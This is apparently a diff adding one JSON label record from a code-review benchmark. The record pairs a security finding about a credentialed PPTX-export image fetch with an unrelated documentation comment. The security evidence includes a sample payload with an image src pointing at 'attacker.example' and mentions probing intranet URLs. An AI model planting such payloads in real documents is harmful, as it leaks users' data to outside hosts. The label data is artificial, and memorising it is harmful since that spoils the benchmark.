@@ -1,0 +1,68 @@
+{
+ "schema": "pair-label",
+ "schema_version": 1,
+ "pair_key": "5729fe71ac24",
+ "pair_key_vintage": "harvest.mjs at wafflebase#801 de4dde47b",
+ "corpus_version": "2026-08-10-pilot-reviewed",
+ "run_id": "pilot-01__k2",
+ "item_id": "pr-429",
+ "rubric": "one-fix-discharges-both",
+ "verdict": "different",
+ "label_source": "silver",
+ "annotators": [
+  "claude-opus-5"
+ ],
+ "confidence": "high",
+ "evidence": "SSRF in the frontend PPTX export path with `credentials: \"include\"`. Unrelated.",
+ "adjudication_basis": {
+  "shown": [
+   "item",
+   "both files and lines",
+   "both severities",
+   "panel summary",
+   "panel evidence",
+   "coderabbit title",
+   "coderabbit detail prose"
+  ],
+  "not_shown": [
+   "the diff",
+   "the matcher's verdict",
+   "score/tokens/loc/symbolOverlap",
+   "sibling pairs of either finding"
+  ],
+  "coderabbit_detail_available": true
+ },
+ "panel": {
+  "arm": "panel",
+  "file": "packages/frontend/src/app/slides/pptx-actions.ts",
+  "line": 94,
+  "summary": "New PPTX export fetches attacker-controllable image `src` values with `credentials: \"include\"` and no scheme/host allowlist",
+  "evidence": "`exportSlidesPptxAndDownload` passes every `ImageElement.data.src` in the deck straight into `docsImageFetcher` (pptx-actions.ts:94). `docsImageFetcher` does `fetch(resolved, { credentials: \"include\" })` (packages/frontend/src/app/docs/export-utils.ts:51) and `resolveImageUrl` explicitly preserves ANY absolute scheme — `http:`, `https:`, `file:`, `blob:`, `data:` (export-utils.ts:13-15). The `src` is fully attacker-controlled: the content-write boundary validates only `id`/`type`/`frame` on an element and never inspects `data.src` (packages/backend/src/api/v1/docs-content.controller.ts:337-357), so any workspace member or API-key holder can PUT a deck containing `{type:'image', data:{src:'https://attacker.example/beacon'}}`. When a victim opens Export → PowerPoint (.pptx), their browser issues a credentialed request to the attacker's host, disclosing IP/UA/timing, and can be pointed at internal same-origin/intranet URLs for probing. Cookie theft is largely blunted because auth cookies are SameSite=Lax (packages/backend/src/auth/auth.controller.ts:230), which is why confidence is medium rather than high; the unvalidated-URL credentialed fetch itself is still the weakness. The same pattern pre-exists in the PDF path, but this change adds a new consumer of it.",
+  "severity": "major",
+  "lens": "security",
+  "finding_key": "packages/frontend/src/app/slides/pptx-actions.ts::new pptx export fetches attacker-controllable image `src` values with `credentials: \"include\"` and no scheme/host allowlist"
+ },
+ "coderabbit": {
+  "arm": "coderabbit",
+  "file": "packages/documentation/developers/rest-api.md",
+  "line": 82,
+  "summary": "Update preceding CRUD description to include slides.",
+  "detail": "**Update preceding CRUD description to include slides.** Line 49 states \"Document CRUD works for both sheets and docs\" but the type table and examples now include `\"slides\"`. Update line 49 to match:",
+  "severity": "minor",
+  "finding_key": "packages/documentation/developers/rest-api.md::update preceding crud description to include slides."
+ },
+ "produced_against": {
+  "repo_head": "de4dde47be012f80a6b935a5f72ad256198a3f64",
+  "note": "wafflebase#801, unmerged at label time"
+ },
+ "diff_sha256": "sha256:29727fad241a9a9b7d2465030740e71af40a1f8c309c216196829d1045a70693",
+ "matcher": {
+  "verdict_at_label_time": "maybe",
+  "reason": "partial evidence (location 0, content 0.05) — needs adjudication",
+  "score": 0.32380952380952377
+ },
+ "labeled_at_utc": "2026-08-13T06:36:23.380Z",
+ "harness": "in-session",
+ "rubric_backfilled": "added 2026-08-13; label-maybes.mjs record() omitted it for batches 1-4. The verdicts themselves are unchanged.",
+ "pair_key_vintage_backfilled": "added 2026-08-13; label-maybes.mjs record() omitted it. Recovered from produced_against.repo_head, identical on all 297, and cross-checked against the records that already carried it."
+}
